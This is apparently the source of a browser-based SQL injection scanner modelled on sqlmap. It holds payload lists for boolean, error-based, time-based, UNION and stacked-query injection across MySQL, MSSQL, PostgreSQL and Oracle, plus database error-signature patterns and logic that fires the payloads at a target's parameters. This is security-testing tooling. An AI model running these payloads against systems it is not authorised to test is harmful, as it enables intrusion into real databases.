// Origami SQL Injection Tester
// Mirrors sqlmap's detection methodology for browser-based SQLi testing

const SQLI_PAYLOADS = {
  heuristic: ["'", '"', "' OR '1'='1'--+", "' AND '1'='2'--+", "1;--"],

  boolean: [
    // Numeric-safe (no leading quote) — works for integer columns
    { true: " AND 1=1-- -",       false: " AND 1=2-- -",       name: "AND boolean-based blind - numeric" },
    { true: " OR 1=1-- -",        false: " OR 1=2-- -",        name: "OR boolean-based blind - numeric" },
    { true: " AND 2=2-- -",       false: " AND 2=3-- -",       name: "AND boolean-based blind - numeric alt" },
    // String-param variants (leading quote) — works for quoted string columns
    { true: "' AND '1'='1'--+",   false: "' AND '1'='2'--+",  name: "AND boolean-based blind - string" },
    { true: "' AND 1=1--+",       false: "' AND 1=2--+",       name: "AND boolean-based blind - string2" },
  ],

  error: {
    mysql: [
      // Numeric-safe (no leading quote) — try these first for integer columns
      " AND GTID_SUBSET(CONCAT(0x7162627071,(SELECT 1),0x7162627071),6858)-- -",
      " AND EXP(~(SELECT * FROM (SELECT 1)a))-- -",
      " AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x7162627071,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
      // String-param variants (leading quote)
      "' AND GTID_SUBSET(CONCAT(0x7162627071,(SELECT 1),0x7162627071),1)--+",
      "' AND EXP(~(SELECT * FROM (SELECT 1)a))--+",
      "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x7162627071,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--+",
    ],
    mssql: [
      " AND 1=CONVERT(int,(SELECT CHAR(113)+CHAR(98)+CHAR(98)+CHAR(112)+CHAR(113)))--",
      "' AND 1=CONVERT(int,(SELECT CHAR(113)+CHAR(98)+CHAR(98)+CHAR(112)+CHAR(113)))--",
    ],
    postgresql: [
      " AND 1=CAST(CHR(113)||CHR(98)||CHR(98)||CHR(112)||CHR(113) AS int)--+",
      "' AND 1=CAST(CHR(113)||CHR(98)||CHR(98)||CHR(112)||CHR(113) AS int)--+",
    ],
    oracle: [
      " AND 1=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(98)||CHR(98)||CHR(112)||CHR(113))--+",
      "' AND 1=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(98)||CHR(98)||CHR(112)||CHR(113))--+",
    ],
    generic: [
      " AND 1=1/(SELECT 0)-- -",
      "' AND 1=1/(SELECT 0)--+",
      "' OR 1=1/(SELECT 0)--+",
    ]
  },

  time: {
    mysql: [
      " AND (SELECT SLEEP({DELAY}))-- -",
      "' AND (SELECT {DELAY} FROM (SELECT(SLEEP({DELAY})))a)--+",
      " AND SLEEP({DELAY})-- -",
    ],
    postgresql: [
      "'; SELECT pg_sleep({DELAY})--",
      "' AND 1=(SELECT 1 FROM pg_sleep({DELAY}))--+",
    ],
    mssql: [
      "'; WAITFOR DELAY '0:0:{DELAY}'--",
      "' AND 1=WAITFOR DELAY '0:0:{DELAY}'--",
    ],
    oracle: [
      "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65)||CHR(65)||CHR(65),{DELAY})--+",
    ],
    generic: [
      " OR SLEEP({DELAY})--",
      "' OR SLEEP({DELAY})--+",
    ]
  },

  union: {
    orderByProbe: " ORDER BY {N}-- -",
    inject: " UNION ALL SELECT {COLS}-- -"
  }
};

const SQLI_ERROR_SIGNATURES = {
  mysql:      [/you have an error in your sql syntax/i, /warning.*mysql/i, /mysql_fetch/i, /mysql_num_rows/i, /supplied argument is not a valid MySQL/i],
  mssql:      [/unclosed quotation mark/i, /microsoft ole db provider for sql server/i, /syntax error.*converting/i, /microsoft.*odbc.*sql server/i],
  postgresql: [/pg_query\(\)/i, /unterminated quoted string at or near/i, /pgsql/i, /postgresql.*error/i],
  oracle:     [/ora-[0-9]{5}/i, /oracle.*driver/i, /sql command not properly ended/i],
  sqlite:     [/sqlite.*error/i, /near ".*": syntax error/i, /sqlite_exec/i],
  generic:    [/sql syntax/i, /syntax error/i, /database error/i, /odbc.*driver/i, /jdbc/i]
};

const CANARY_HEX = '0x7162627071';
const CANARY_STR = 'qbbpq';
const UNION_CANARY_HEX = '0x71787a6a71';
const UNION_CANARY_STR = 'qxzjq';

class SQLiTesterAbortError extends Error {
  constructor() {
    super('Scan aborted by user');
    this.name = 'SQLiTesterAbortError';
  }
}

class SQLiTester {
  constructor(config, callbacks) {
    this.url = config.url;
    this.method = (config.method || 'GET').toUpperCase();
    // Accept either an array [{ name, value }] from the UI or a plain dict { name: value }
    if (Array.isArray(config.params)) {
      this.params = {};
      for (const p of config.params) {
        if (p && p.name) this.params[p.name] = p.value != null ? String(p.value) : '';
      }
    } else {
      this.params = config.params || {};
    }
    this.techniques = config.techniques || new Set(['B', 'E', 'T', 'U', 'S']);
    this.dbms = config.dbms || 'auto';
    this.delay = config.delay || 5;
    this.risk = config.risk || 1;
    this.headers = config.headers || {};
    this.body = config.body || '';

    this.callbacks = callbacks;
    this.findings = [];
    this.paramState = {};
    this.baselineBody = '';
    this.baselineLength = 0;
    this.baselineTiming = 0;
    this.unstable = false;
    this.requestCount = 0;
  }

  async run() {
    try {
      await this._phaseBaseline();
      await this._phaseHeuristic();

      if (this.techniques.has('B')) await this._phaseBoolean();
      if (this.techniques.has('E')) await this._phaseError();
      if (this.techniques.has('T')) await this._phaseTime();
      if (this.techniques.has('U')) await this._phaseUnion();
      if (this.techniques.has('S') && this.risk >= 2) await this._phaseStacked();

      this._log('info', `Scan complete. ${this.findings.length} finding(s) confirmed across ${this.requestCount} requests`);
      this.callbacks.onProgress('complete', null, 100);
    } catch (e) {
      if (e instanceof SQLiTesterAbortError) {
        this._log('warning', 'Scan aborted by user');
      } else {
        this._log('error', `Scan error: ${e.message}`);
        throw e;
      }
    }

    return this.findings;
  }

  // --- Phase 1: Baseline stability ---

  async _phaseBaseline() {
    this._log('info', 'Phase 1: Testing baseline stability');
    this.callbacks.onProgress('baseline', null, 0);
    this._checkAbort();

    const r1 = await this._sendRequest(this.url, this.method, this.headers, this.body);
    const r2 = await this._sendRequest(this.url, this.method, this.headers, this.body);

    this.baselineBody = r1.body || '';
    this.baselineLength = this.baselineBody.length;
    this.baselineTiming = this._meanTiming([r1.timing, r2.timing]);

    const diff = this._lengthDifference((r1.body || '').length, (r2.body || '').length);
    if (diff > 10) {
      this._log('warning', `Content not stable, results may be unreliable (${diff.toFixed(1)}% variance)`);
      this.unstable = true;
    } else {
      this._log('info', `Baseline established: ${this.baselineLength} bytes, ${this.baselineTiming.toFixed(0)}ms avg`);
    }
  }

  // --- Phase 2: Dynamic check + heuristic ---

  async _phaseHeuristic() {
    this._log('info', 'Phase 2: Dynamic content and heuristic checks');
    const paramNames = Object.keys(this.params);
    this.callbacks.onProgress('heuristic', null, 5);

    for (let i = 0; i < paramNames.length; i++) {
      const param = paramNames[i];
      this._checkAbort();
      this.callbacks.onProgress('heuristic', param, 5 + (i / paramNames.length) * 10);

      this.paramState[param] = {
        injectable: false,
        detectedDbms: null,
        wafDetected: false,
        confirmedTechniques: []
      };

      // Dynamic check
      const dynUrl = this._buildRequestUrl(param, this.params[param] + 'origami_rnd');
      const dynBody = this._buildRequestBody(param, this.params[param] + 'origami_rnd');
      const dynResp = await this._sendRequest(dynUrl, this.method, this.headers, dynBody);

      const dynDiff = this._lengthDifference(this.baselineLength, (dynResp.body || '').length);
      if (dynDiff > 2) {
        this._log('info', `${this.method} parameter '${param}' appears to be dynamic`);
      }

      // Heuristic: inject a single quote
      const heurUrl = this._buildRequestUrl(param, this.params[param] + "'");
      const heurBody = this._buildRequestBody(param, this.params[param] + "'");
      const heurResp = await this._sendRequest(heurUrl, this.method, this.headers, heurBody);

      if (heurResp.status === 403 || heurResp.status === 429) {
        this._log('warning', `WAF/IPS detected for parameter '${param}' (HTTP ${heurResp.status})`);
        this.paramState[param].wafDetected = true;
      }

      const heurDiff = this._lengthDifference(this.baselineLength, (heurResp.body || '').length);
      const detectedDbms = this._fingerPrintDbms(heurResp.body || '');
      const hasErrorSig = detectedDbms !== null;

      if (heurDiff > 5 || hasErrorSig) {
        this.paramState[param].injectable = true;
        if (detectedDbms) {
          this.paramState[param].detectedDbms = detectedDbms;
        }
        const dbmsMsg = detectedDbms ? ` (possible DBMS: ${detectedDbms})` : '';
        this._log('info', `Heuristic test shows parameter '${param}' might be injectable${dbmsMsg}`);
      }
    }
  }

  // --- Phase 3: Boolean-based blind ---

  async _phaseBoolean() {
    this._log('info', 'Phase 3: Boolean-based blind SQL injection tests');
    const candidates = this._injectableCandidates();
    if (candidates.length === 0) return;

    for (let ci = 0; ci < candidates.length; ci++) {
      const param = candidates[ci];
      this.callbacks.onProgress('boolean', param, 15 + (ci / candidates.length) * 20);
      let confirmedPairs = 0;
      let lastConfirmedPayload = null;

      for (const pair of SQLI_PAYLOADS.boolean) {
        this._checkAbort();

        const trueUrl = this._buildRequestUrl(param, this.params[param] + pair.true);
        const trueBody = this._buildRequestBody(param, this.params[param] + pair.true);
        const trueResp = await this._sendRequest(trueUrl, this.method, this.headers, trueBody);
        const trueLen = this._stripReflectiveValues(trueResp.body || '', pair.true).length;

        const falseUrl = this._buildRequestUrl(param, this.params[param] + pair.false);
        const falseBody = this._buildRequestBody(param, this.params[param] + pair.false);
        const falseResp = await this._sendRequest(falseUrl, this.method, this.headers, falseBody);
        const falseLen = this._stripReflectiveValues(falseResp.body || '', pair.false).length;

        const trueDiff  = this._lengthDifference(this.baselineLength, trueLen);
        const falseDiff = this._lengthDifference(this.baselineLength, falseLen);
        const trueFalseDiff = this._lengthDifference(trueLen, falseLen);

        this._log('info', `  [${pair.name}] true=${trueLen}b false=${falseLen}b baseline=${this.baselineLength}b (trueDiff=${trueDiff.toFixed(1)}%, falseDiff=${falseDiff.toFixed(1)}%, tfDiff=${trueFalseDiff.toFixed(1)}%)`);

        // AND-style: true≈baseline AND true≠false (false removes results)
        const andConfirmed = trueDiff <= 5 && trueFalseDiff > 5;
        // OR-style: false≈baseline AND true≠false (true adds extra rows)
        const orConfirmed  = falseDiff <= 5 && trueFalseDiff > 5;

        if (andConfirmed || orConfirmed) {
          confirmedPairs++;
          lastConfirmedPayload = pair;
          const style = andConfirmed ? 'AND-style' : 'OR-style';
          this._log('info', `  -> Payload pair matches boolean blind pattern [${style}] (${confirmedPairs}/2 needed)`);
        }

        if (confirmedPairs >= 2) break;
      }

      if (confirmedPairs >= 2) {
        const finding = {
          technique: 'B',
          param,
          payload: lastConfirmedPayload.true,
          dbms: this.paramState[param].detectedDbms || 'unknown',
          confirmed: true,
          title: `Boolean-based blind SQLi: ${param}`,
          description: `Parameter '${param}' is vulnerable to boolean-based blind SQL injection. ${confirmedPairs} distinct payload pairs confirmed differential responses.`,
          evidence: `Payload: ${lastConfirmedPayload.name}`,
          timestamp: new Date().toISOString()
        };
        this._addFinding(finding);
      }
    }
  }

  // --- Phase 4: Error-based ---

  async _phaseError() {
    this._log('info', 'Phase 4: Error-based SQL injection tests');
    const candidates = this._injectableCandidates();
    if (candidates.length === 0) return;

    for (let ci = 0; ci < candidates.length; ci++) {
      const param = candidates[ci];
      this.callbacks.onProgress('error', param, 35 + (ci / candidates.length) * 15);

      const dbmsTargets = this._getDbmsTargets(param, SQLI_PAYLOADS.error);
      let confirmedForParam = false;
      let firstPotential = null;  // Only emit one POTENTIAL per param

      for (const [dbmsName, payloads] of dbmsTargets) {
        if (confirmedForParam) break;

        for (const payload of payloads) {
          this._checkAbort();

          const reqUrl = this._buildRequestUrl(param, this.params[param] + payload);
          const reqBody = this._buildRequestBody(param, this.params[param] + payload);
          const resp = await this._sendRequest(reqUrl, this.method, this.headers, reqBody);
          const body = resp.body || '';

          const canaryFound = body.includes(CANARY_STR);
          const errorDbms = this._fingerPrintDbms(body);

          this._log('info', `  [${dbmsName}] '${param}' canary=${canaryFound} errorSig=${errorDbms || 'none'}`);

          if (canaryFound) {
            const finding = {
              technique: 'E',
              param,
              payload,
              dbms: dbmsName !== 'generic' ? dbmsName : (errorDbms || 'unknown'),
              confirmed: true,
              title: `Error-based SQLi: ${param}`,
              description: `Parameter '${param}' is vulnerable to error-based SQL injection. Canary string '${CANARY_STR}' reflected in response body.`,
              evidence: `DBMS: ${dbmsName}, Payload: ${payload.substring(0, 60)}...`,
              timestamp: new Date().toISOString()
            };
            this._addFinding(finding);
            confirmedForParam = true;
            break;
          } else if (errorDbms && !firstPotential) {
            // Remember first potential but don't emit yet — wait to see if confirmed comes
            firstPotential = {
              technique: 'E',
              param,
              payload,
              dbms: errorDbms,
              confirmed: false,
              title: `Potential error-based SQLi: ${param}`,
              description: `Parameter '${param}' triggers ${errorDbms} error signatures. Canary not reflected — server may suppress error output. Manual verification recommended.`,
              evidence: `DBMS: ${errorDbms}, Payload: ${payload.substring(0, 60)}...`,
              timestamp: new Date().toISOString()
            };
          }
        }
      }

      // Only emit the POTENTIAL if no confirmed finding was produced
      if (!confirmedForParam && firstPotential) {
        this._addFinding(firstPotential);
      }
    }
  }

  // --- Phase 5: Time-based blind ---

  async _phaseTime() {
    this._log('info', 'Phase 5: Time-based blind SQL injection tests');
    const candidates = this._injectableCandidates();
    if (candidates.length === 0) return;

    // Establish fresh timing baseline with 3 requests
    const timings = [];
    for (let i = 0; i < 3; i++) {
      this._checkAbort();
      const r = await this._sendRequest(this.url, this.method, this.headers, this.body);
      timings.push(r.timing);
    }
    const baselineMean = this._meanTiming(timings);
    this._log('info', `  Time baseline: ${baselineMean.toFixed(0)}ms (from 3 requests)`);

    const delayMs = this.delay * 1000;

    for (let ci = 0; ci < candidates.length; ci++) {
      const param = candidates[ci];
      this.callbacks.onProgress('time', param, 50 + (ci / candidates.length) * 20);

      const dbmsTargets = this._getDbmsTargets(param, SQLI_PAYLOADS.time);

      for (const [dbmsName, payloads] of dbmsTargets) {
        let confirmed = false;

        for (const payloadTemplate of payloads) {
          this._checkAbort();
          const payload = payloadTemplate.replace(/\{DELAY\}/g, String(this.delay));

          const timeoutMs = (this.delay + 5) * 1000;
          const reqUrl = this._buildRequestUrl(param, this.params[param] + payload);
          const reqBody = this._buildRequestBody(param, this.params[param] + payload);
          const resp = await this._sendRequest(reqUrl, this.method, this.headers, reqBody, timeoutMs);

          if (resp.status === 403 || resp.status === 429) {
            this.paramState[param].wafDetected = true;
            this._log('warning', `  WAF detected for '${param}' (HTTP ${resp.status})`);
            continue;
          }

          const elapsed = resp.timing;
          this._log('info', `  [${dbmsName}] '${param}' elapsed=${elapsed}ms (threshold=${delayMs}ms)`);

          if (elapsed >= delayMs) {
            // First hit, confirm with a second request
            this._log('info', `  -> First timing match, sending confirmation request`);
            const confirmUrl = this._buildRequestUrl(param, this.params[param] + payload);
            const confirmBody = this._buildRequestBody(param, this.params[param] + payload);
            const confirmResp = await this._sendRequest(confirmUrl, this.method, this.headers, confirmBody, timeoutMs);

            if (confirmResp.timing >= delayMs) {
              const finding = {
                technique: 'T',
                param,
                payload,
                dbms: dbmsName !== 'generic' ? dbmsName : 'unknown',
                confirmed: true,
                title: `Time-based blind SQLi: ${param}`,
                description: `Parameter '${param}' is vulnerable to time-based blind SQL injection. Two consecutive ${this.delay}s delays confirmed (${elapsed}ms, ${confirmResp.timing}ms vs baseline ${baselineMean.toFixed(0)}ms).`,
                evidence: `DBMS: ${dbmsName}, Delay: ${this.delay}s, Payload: ${payload.substring(0, 60)}...`,
                timestamp: new Date().toISOString()
              };
              this._addFinding(finding);
              confirmed = true;
              break;
            } else {
              const finding = {
                technique: 'T',
                param,
                payload,
                dbms: dbmsName !== 'generic' ? dbmsName : 'unknown',
                confirmed: false,
                title: `Potential time-based blind SQLi: ${param}`,
                description: `Parameter '${param}' showed one timing anomaly (${elapsed}ms) but failed confirmation (${confirmResp.timing}ms). May be network jitter.`,
                evidence: `DBMS: ${dbmsName}, Delay: ${this.delay}s`,
                timestamp: new Date().toISOString()
              };
              this._addFinding(finding);
            }
          }
        }
        if (confirmed) break;
      }
    }
  }

  // --- Phase 6: UNION-based ---

  async _phaseUnion() {
    this._log('info', 'Phase 6: UNION-based SQL injection tests');
    const candidates = this._injectableCandidates();
    if (candidates.length === 0) return;

    for (let ci = 0; ci < candidates.length; ci++) {
      const param = candidates[ci];
      this.callbacks.onProgress('union', param, 70 + (ci / candidates.length) * 15);

      // Binary search for column count via ORDER BY
      const colCount = await this._detectColumnCount(param);
      if (colCount === null) {
        this._log('info', `  Could not determine column count for '${param}'`);
        continue;
      }

      this._log('info', `  Target URL appears to have ${colCount} columns in query for '${param}'`);

      // Try UNION injection with canary in each column position
      let found = false;
      for (let pos = 0; pos < colCount && !found; pos++) {
        this._checkAbort();

        const cols = [];
        for (let c = 0; c < colCount; c++) {
          cols.push(c === pos ? UNION_CANARY_HEX : 'NULL');
        }
        const unionPayload = SQLI_PAYLOADS.union.inject.replace('{COLS}', cols.join(','));
        const reqUrl = this._buildRequestUrl(param, this.params[param] + unionPayload);
        const reqBody = this._buildRequestBody(param, this.params[param] + unionPayload);
        const resp = await this._sendRequest(reqUrl, this.method, this.headers, reqBody);

        if ((resp.body || '').includes(UNION_CANARY_STR)) {
          const finding = {
            technique: 'U',
            param,
            payload: unionPayload,
            dbms: this.paramState[param].detectedDbms || 'unknown',
            confirmed: true,
            title: `UNION-based SQLi: ${param}`,
            description: `Parameter '${param}' is vulnerable to UNION-based SQL injection. Canary '${UNION_CANARY_STR}' reflected at column position ${pos + 1} of ${colCount}.`,
            evidence: `Columns: ${colCount}, Canary position: ${pos + 1}`,
            timestamp: new Date().toISOString()
          };
          this._addFinding(finding);
          found = true;
        }
      }
    }
  }

  // --- Phase 7: Stacked queries ---

  async _phaseStacked() {
    this._log('info', 'Phase 7: Stacked queries test (risk >= 2)');
    const candidates = this._injectableCandidates();
    if (candidates.length === 0) return;

    for (let ci = 0; ci < candidates.length; ci++) {
      const param = candidates[ci];
      this.callbacks.onProgress('stacked', param, 85 + (ci / candidates.length) * 10);
      this._checkAbort();

      const payload = '; SELECT 1--';
      const reqUrl = this._buildRequestUrl(param, this.params[param] + payload);
      const reqBody = this._buildRequestBody(param, this.params[param] + payload);
      const resp = await this._sendRequest(reqUrl, this.method, this.headers, reqBody);
      const respLen = (resp.body || '').length;

      const diff = this._lengthDifference(this.baselineLength, respLen);
      const errorDbms = this._fingerPrintDbms(resp.body || '');

      if (diff > 10 || errorDbms) {
        const finding = {
          technique: 'S',
          param,
          payload,
          dbms: errorDbms || this.paramState[param].detectedDbms || 'unknown',
          confirmed: false,
          title: `Potential stacked queries SQLi: ${param}`,
          description: `Parameter '${param}' shows anomalous response to stacked query payload (${diff.toFixed(1)}% length change). Manual verification required.`,
          evidence: errorDbms ? `Error DBMS: ${errorDbms}` : `Length diff: ${diff.toFixed(1)}%`,
          timestamp: new Date().toISOString()
        };
        this._addFinding(finding);
      }
    }
  }

  // --- Column count detection for UNION ---

  async _detectColumnCount(param) {
    // Binary search: test ORDER BY 1, 2, 4, 8, 16... until error
    let upper = 1;
    let lastGood = 0;
    const maxCols = 64;

    // Exponential probe to find upper bound
    while (upper <= maxCols) {
      this._checkAbort();
      const payload = SQLI_PAYLOADS.union.orderByProbe.replace('{N}', String(upper));
      const reqUrl = this._buildRequestUrl(param, this.params[param] + payload);
      const reqBody = this._buildRequestBody(param, this.params[param] + payload);
      const resp = await this._sendRequest(reqUrl, this.method, this.headers, reqBody);

      const respLen = (resp.body || '').length;
      const diff = this._lengthDifference(this.baselineLength, respLen);
      const hasError = this._fingerPrintDbms(resp.body || '') !== null ||
                       /order by/i.test(resp.body || '') ||
                       diff > 20;

      if (hasError && upper === 1) {
        return null;
      }

      if (hasError) {
        break;
      }

      lastGood = upper;
      upper *= 2;
    }

    if (lastGood === 0) return null;

    // Binary search between lastGood and upper
    let lo = lastGood;
    let hi = Math.min(upper, maxCols);

    while (lo < hi) {
      this._checkAbort();
      const mid = Math.ceil((lo + hi) / 2);
      const payload = SQLI_PAYLOADS.union.orderByProbe.replace('{N}', String(mid));
      const reqUrl = this._buildRequestUrl(param, this.params[param] + payload);
      const reqBody = this._buildRequestBody(param, this.params[param] + payload);
      const resp = await this._sendRequest(reqUrl, this.method, this.headers, reqBody);

      const respLen = (resp.body || '').length;
      const diff = this._lengthDifference(this.baselineLength, respLen);
      const hasError = this._fingerPrintDbms(resp.body || '') !== null || diff > 20;

      if (hasError) {
        hi = mid - 1;
      } else {
        lo = mid;
      }
    }

    return lo > 0 ? lo : null;
  }

  // --- Helper: get DBMS targets for a param ---

  _getDbmsTargets(param, payloadBank) {
    const targets = [];
    const detected = this.paramState[param].detectedDbms;
    const userDbms = this.dbms;

    if (userDbms && userDbms !== 'auto' && payloadBank[userDbms]) {
      targets.push([userDbms, payloadBank[userDbms]]);
    } else if (detected && payloadBank[detected]) {
      targets.push([detected, payloadBank[detected]]);
      if (payloadBank.generic) targets.push(['generic', payloadBank.generic]);
    } else {
      for (const dbmsName of Object.keys(payloadBank)) {
        targets.push([dbmsName, payloadBank[dbmsName]]);
      }
    }

    return targets;
  }

  // --- Helper: list of injectable candidate params ---

  _injectableCandidates() {
    const flagged = Object.keys(this.paramState).filter(p => this.paramState[p].injectable);
    // If the heuristic didn't flag any param (server returned no obvious error),
    // fall back to testing all known params — blind injections can be silent.
    if (flagged.length === 0) {
      const all = Object.keys(this.paramState);
      if (all.length > 0) {
        this._log('info', 'Heuristic flagged no params; testing all params for each technique');
      }
      return all;
    }
    return flagged;
  }

  // --- URL and body builders ---

  _buildRequestUrl(paramName, value) {
    if (this.method === 'GET') {
      return this._buildUrl(this.url, paramName, value);
    }
    return this.url;
  }

  _buildRequestBody(paramName, value) {
    if (this.method === 'POST') {
      return this._buildPostBody(this.body, paramName, value);
    }
    return this.body;
  }

  _buildUrl(baseUrl, paramName, payload) {
    try {
      const urlObj = new URL(baseUrl);
      urlObj.searchParams.set(paramName, payload);
      return urlObj.toString();
    } catch (e) {
      // Fallback for malformed URLs
      const separator = baseUrl.includes('?') ? '&' : '?';
      return `${baseUrl}${separator}${encodeURIComponent(paramName)}=${encodeURIComponent(payload)}`;
    }
  }

  _buildPostBody(body, paramName, payload) {
    // Try JSON body
    try {
      const parsed = JSON.parse(body);
      if (typeof parsed === 'object' && parsed !== null) {
        parsed[paramName] = payload;
        return JSON.stringify(parsed);
      }
    } catch (e) {
      // Not JSON, try form-encoded
    }

    // Form-encoded body
    const params = new URLSearchParams(body);
    params.set(paramName, payload);
    return params.toString();
  }

  _stripReflectiveValues(html, paramValue) {
    if (!paramValue) return html;
    // Remove all occurrences of the injected value to avoid length skew
    let cleaned = html;
    try {
      const escaped = paramValue.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
      cleaned = html.replace(new RegExp(escaped, 'g'), '');
    } catch (e) {
      // If regex fails, do a simple string replace
      while (cleaned.includes(paramValue)) {
        cleaned = cleaned.split(paramValue).join('');
      }
    }
    return cleaned;
  }

  // --- Comparison helpers ---

  _lengthDifference(a, b) {
    if (a === 0 && b === 0) return 0;
    const max = Math.max(a, b);
    if (max === 0) return 0;
    return (Math.abs(a - b) / max) * 100;
  }

  _meanTiming(timings) {
    if (!timings || timings.length === 0) return 0;
    return timings.reduce((sum, t) => sum + (t || 0), 0) / timings.length;
  }

  _fingerPrintDbms(responseBody) {
    if (!responseBody) return null;

    for (const [dbms, patterns] of Object.entries(SQLI_ERROR_SIGNATURES)) {
      if (dbms === 'generic') continue;
      for (const pattern of patterns) {
        if (pattern.test(responseBody)) return dbms;
      }
    }

    // Check generic last
    for (const pattern of SQLI_ERROR_SIGNATURES.generic) {
      if (pattern.test(responseBody)) return 'generic';
    }

    return null;
  }

  // --- Request + abort helpers ---

  async _sendRequest(url, method, headers, body, timeout) {
    this.requestCount++;
    try {
      return await this.callbacks.sendRequest({ url, method, headers, body, timeout: timeout || 10000 });
    } catch (e) {
      return { status: 0, body: '', timing: 0, error: e.message };
    }
  }

  _checkAbort() {
    if (this.callbacks.shouldAbort && this.callbacks.shouldAbort()) {
      throw new SQLiTesterAbortError();
    }
  }

  // --- Logging + finding helpers ---

  _log(level, msg) {
    if (this.callbacks.onLog) {
      this.callbacks.onLog(level, msg);
    }
  }

  _addFinding(finding) {
    this.findings.push(finding);
    if (this.callbacks.onResult) {
      this.callbacks.onResult(finding);
    }
    const status = finding.confirmed ? 'success' : 'warning';
    this._log(status, `[${finding.technique}] ${finding.title}`);
  }
}
